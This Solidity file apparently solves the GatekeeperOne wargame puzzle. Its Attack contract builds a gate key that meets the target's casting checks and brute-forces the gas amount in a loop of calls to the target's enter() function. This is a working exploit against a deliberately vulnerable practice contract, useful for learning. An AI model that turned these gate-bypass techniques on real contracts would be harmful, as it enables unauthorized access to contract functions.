// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

contract Attack {

    address target;
    uint public extragas;

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "Attack: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "Attack: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(msg.sender)), "Attack: invalid gateThree part three");
        _;
    }

    constructor(address trg) {
        target = trg;
    }

    function left(bytes8 _gateKey) pure public   returns(uint32) {
        return uint32(uint64(_gateKey));
    }

    function oneu16u64(bytes8 _gateKey) pure public   returns(uint16) {
        return uint16(uint64(_gateKey));
    }

    function twou64(bytes8 _gateKey) pure public   returns(uint64) {
        return uint64(_gateKey);
    }

    function threeu16u64(address addr) pure public   returns(uint16) {
        return uint16(uint160(addr));
    }

    function testThree(bytes8 _gateKey) view public gateThree(_gateKey) returns(bool) {
        return true;
    }

    // function prepare(bytes8 _gateKey) public returns (uint) {
    //     extragas =  GatekeeperOne(target).enter2{gas: 1000000}(_gateKey);
    // }

    function enter(bytes8 _gateKey, uint start) public payable gateThree(_gateKey) {

        uint cnt = 0;
        uint gasSupply = 8191*3+start;

        for (; cnt < 300; ++cnt) {
            //We found that the magic extra gas number is 200!
            
            (bool success, ) = address(target).call{gas: gasSupply}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                break;
            }

            ++gasSupply;
        }

        extragas = cnt+start;
    }

    receive() external payable {}
}